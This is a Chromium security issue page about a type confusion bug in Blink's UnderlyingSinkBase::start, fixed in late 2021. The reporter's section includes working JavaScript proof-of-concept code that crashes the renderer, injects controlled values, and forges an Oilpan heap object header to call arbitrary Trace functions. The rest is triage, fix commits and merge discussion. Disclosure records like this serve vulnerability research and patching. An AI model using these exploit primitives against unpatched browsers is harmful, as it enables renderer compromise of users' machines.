# Security: Type confusion in UnderlyingSinkBase::start

| Field | Value |
|-------|-------|
| **Issue ID** | [40057686](https://issues.chromium.org/issues/40057686) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ji...@gmail.com |
| **Assignee** | ri...@chromium.org |
| **Created** | 2021-10-24 |
| **Bounty** | $15,000.00 |

## Description

**VULNERABILITY DETAILS**  

When constructing WritableStreams, UnderlyingSinkBase can be exposed  

by setting getter for "type" [ref-wr](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482), and UnderlyingSinkBase::start  

accepts arbitrary v8 value as argument, which is converted to  

WritableStreamDefaultController without type checks [ref-vuln](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d).

ScriptPromise start(ScriptState\* script\_state,  

ScriptValue controller,  

ExceptionState& exception\_state) {  

controller\_ = WritableStreamDefaultController::From(controller); <--  

return start(script\_state, controller\_, exception\_state);  

}

This allows setting the `controller_` field to an arbitrary pointer.

Note that UnderlyingSourceBase also have the same pattern, but I couldn't get that object,  

because "type" are already defined there.

**VERSION**  

Chrome Version: 95.0.4638.54 stable  

Operating System: Windows 10 21H1 x64

**REPRODUCTION CASE**

1. The following code (min.html) crashes on 0x828282 because it tries to interpret a Smi value as object pointer:

Object.prototype.**defineGetter**('type', function() {  

this.start(0x414141) // crashes on: 0x828282  

})  

generator = new MediaStreamTrackGenerator('video')  

const wr = generator.writable

2. The following code for the getter above fills all members of WritableStreamDefaultController  
   
   with arbitrary value by confusing with DOMMatrixReadOnly.

f64 = new Float64Array(16)  

(new BigInt64Array(f64.buffer)).fill(0x41414141)  

this.start(new DOMMatrixReadOnly(f64))

Given an information leak such as [crbug.com/1144662](https://crbug.com/1144662), it's possible  

to call an arbitrary function using this primitive.

3. Since there are multiple Member<> oilpan pointers in the target object, we can confuse  
   
   it with a DOMArrayBufferView; it has the base pointer, offset, and length (DOMUint8Array).

We set offset=length=0, and base pointer becomes a Member<> by type confusion, which is Traced later.  

The following code creates a fake oilpan chunk.

size=0x18; // size of the object  

index=520; // GCInfoIndex  

in\_construction=1;  

marked=0;  

// u32 is followed by a, there's no gap between them  

// So a[-1] becomes HeapObjectHeader of &u32.data()  

(a=new BigInt64Array(0x10>>2)).fill(BigInt(((size/8)<<17)|(marked<<16)|(index<<2)|(0<<1)|in\_construction)<<32n)  

u32 = new BigInt64Array(0x10>>2)  

u32.fill(0n);  

// Get DOMArrayBufferView-based Uint8Array, not just plain Uint8Array  

u8=(new MIDIMessageEvent('',{data:new Uint8Array(u32.buffer,0,0)})).data  

// Trigger  

this.start(u8)  

// GC  

new ArrayBuffer(0x10000000)

By changing index, we can call any Trace function on u32.data().  

Also we can see a[-1] changed because of marking.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: See crash.txt for min.html

**CREDIT INFORMATION**  

Reporter credit: Yonghwi Jin (@jinmo123) of Theori

## Attachments

- [crash.txt](attachments/crash.txt) (text/plain, 13.7 KB)
- [min.html](attachments/min.html) (text/plain, 197 B)

## Timeline

### [Deleted User] (2021-10-24)

[Empty comment from Monorail migration]

### es...@chromium.org (2021-10-25)

verwaest@, can you please help triage?

[Monorail components: Blink>JavaScript]

### da...@chromium.org (2021-10-26)

[Empty comment from Monorail migration]

### da...@chromium.org (2021-10-26)

This was found in M95, is it also present in M94?

### [Deleted User] (2021-10-26)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ji...@gmail.com (2021-10-26)

Yes, it was also present in 94.

### da...@chromium.org (2021-10-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-10-26)

[Empty comment from Monorail migration]

### ve...@chromium.org (2021-10-28)

[Empty comment from Monorail migration]

### ri...@chromium.org (2021-10-28)

[Empty comment from Monorail migration]

### ri...@chromium.org (2021-10-28)

I have a fix but I haven't written a test yet. How much of a hurry are we in?

### da...@chromium.org (2021-10-28)

Thanks for working on this. You have time to write a test.

https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md lists the time goals of severities (and doesn't list an hard limit for medium)

### [Deleted User] (2021-10-29)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ri...@chromium.org (2021-10-30)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-11-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/26564c88bc9e034cc512afd857cf303193647b9a

commit 26564c88bc9e034cc512afd857cf303193647b9a
Author: Adam Rice <ricea@chromium.org>
Date: Mon Nov 01 07:51:38 2021

Return undefined from UnderlyingSinkBase "type" getter

The "type" attribute of an object passed to the WritableStream
constructor is supposed to return undefined. Add a getter to
UnderlyingSinkBase to ensure it always does.

Add tests to verify that "type" is not inherited from
Object.prototype.type.

Move some methods out-of-line into a new underlying_sink_base.cc file.

Make WritableStreamDefaultController::From() more robust.

BUG=1262791

Change-Id: I97f43233eef0e473fb1a22a3ea8afafe92e16266
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3252171
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Commit-Queue: Adam Rice <ricea@chromium.org>
Cr-Commit-Position: refs/heads/main@{#936834}

[modify] https://crrev.com/26564c88bc9e034cc512afd857cf303193647b9a/third_party/blink/renderer/core/streams/build.gni
[modify] https://crrev.com/26564c88bc9e034cc512afd857cf303193647b9a/third_party/blink/renderer/core/streams/underlying_sink_base.idl
[modify] https://crrev.com/26564c88bc9e034cc512afd857cf303193647b9a/third_party/blink/renderer/core/streams/writable_stream_default_controller.cc
[modify] https://crrev.com/26564c88bc9e034cc512afd857cf303193647b9a/third_party/blink/renderer/core/streams/writable_stream_default_controller.h
[add] https://crrev.com/26564c88bc9e034cc512afd857cf303193647b9a/third_party/blink/renderer/core/streams/underlying_sink_base.cc
[modify] https://crrev.com/26564c88bc9e034cc512afd857cf303193647b9a/third_party/blink/renderer/core/streams/underlying_sink_base.h
[add] https://crrev.com/26564c88bc9e034cc512afd857cf303193647b9a/third_party/blink/web_tests/http/tests/streams/chromium/underlying-sink-base-type-getter.html


### ri...@chromium.org (2021-11-01)

I will request merges once it is shipped to Canary.

### ri...@chromium.org (2021-11-01)

[Empty comment from Monorail migration]

### yh...@chromium.org (2021-11-01)

Didn't you mean 2021-11-04?

### ri...@chromium.org (2021-11-01)

[Empty comment from Monorail migration]

### ri...@chromium.org (2021-11-01)

Yes, thanks.

### [Deleted User] (2021-11-02)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-02)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-02)

Requesting merge to beta M96 because latest trunk commit (936834) appears to be after beta branch point (929512).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-11-02)

Merge review required: M96 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), dgagnon (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2021-11-05)

I don't see any glaring issues on canary, so tentatively approving for merge to M96; please confirm and if no issues please merge to the appropriate V8 branch for M96 before EOD Monday, 8 November so this fix can be included in next week's cut for M96 stable - thank you! 

### gi...@appspot.gserviceaccount.com (2021-11-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f0a63e1f361f2eb8590b35cb960816bc14a994b4

commit f0a63e1f361f2eb8590b35cb960816bc14a994b4
Author: Adam Rice <ricea@chromium.org>
Date: Sat Nov 06 18:52:26 2021

Return undefined from UnderlyingSinkBase "type" getter

The "type" attribute of an object passed to the WritableStream
constructor is supposed to return undefined. Add a getter to
UnderlyingSinkBase to ensure it always does.

Add tests to verify that "type" is not inherited from
Object.prototype.type.

Move some methods out-of-line into a new underlying_sink_base.cc file.

Make WritableStreamDefaultController::From() more robust.

BUG=1262791

(cherry picked from commit 26564c88bc9e034cc512afd857cf303193647b9a)

Change-Id: I97f43233eef0e473fb1a22a3ea8afafe92e16266
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3252171
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Commit-Queue: Adam Rice <ricea@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#936834}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3266824
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/4664@{#806}
Cr-Branched-From: 24dc4ee75e01a29d390d43c9c264372a169273a7-refs/heads/main@{#929512}

[modify] https://crrev.com/f0a63e1f361f2eb8590b35cb960816bc14a994b4/third_party/blink/renderer/core/streams/build.gni
[modify] https://crrev.com/f0a63e1f361f2eb8590b35cb960816bc14a994b4/third_party/blink/renderer/core/streams/underlying_sink_base.idl
[modify] https://crrev.com/f0a63e1f361f2eb8590b35cb960816bc14a994b4/third_party/blink/renderer/core/streams/writable_stream_default_controller.cc
[modify] https://crrev.com/f0a63e1f361f2eb8590b35cb960816bc14a994b4/third_party/blink/renderer/core/streams/writable_stream_default_controller.h
[add] https://crrev.com/f0a63e1f361f2eb8590b35cb960816bc14a994b4/third_party/blink/renderer/core/streams/underlying_sink_base.cc
[modify] https://crrev.com/f0a63e1f361f2eb8590b35cb960816bc14a994b4/third_party/blink/renderer/core/streams/underlying_sink_base.h
[add] https://crrev.com/f0a63e1f361f2eb8590b35cb960816bc14a994b4/third_party/blink/web_tests/http/tests/streams/chromium/underlying-sink-base-type-getter.html


### ri...@chromium.org (2021-11-08)

Answers to the merge justification. Sorry this is late.

1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines

Security fix for "easy" render process takeover.

2. What changes specifically would you like to merge? Please link to Gerrit.

https://chromium-review.googlesource.com/c/chromium/src/+/3252171

3. Have the changes been released and tested on canary?

Yes.

4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No.

5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents

N/A

6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

No.

### ri...@chromium.org (2021-11-08)

Requesting merge to M95 if there is going to be another release.

### [Deleted User] (2021-11-08)

Merge review required: M95 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: benmason (Android), harrysouders (iOS), None (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ri...@chromium.org (2021-11-08)

See #27 for answers to merge request questions.

### am...@chromium.org (2021-11-08)

There are not further planned releases of M95; M96 ships to stable next week 

### am...@google.com (2021-11-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-11-11)

Congratulations! The VRP Panel has decided to reward you $15,000 for this report, including the V8 exploit bonus. Very nice work and thank you for this report!! 

### am...@chromium.org (2021-11-11)

[Empty comment from Monorail migration]

### ad...@google.com (2021-11-12)

[Empty comment from Monorail migration]

### am...@google.com (2021-11-18)

[Empty comment from Monorail migration]

### am...@google.com (2021-12-23)

[Empty comment from Monorail migration]

### ji...@gmail.com (2021-12-31)

Hello, can I update the credit information? It seems like the company name is omitted.

### [Deleted User] (2022-02-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1262791?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057686)*
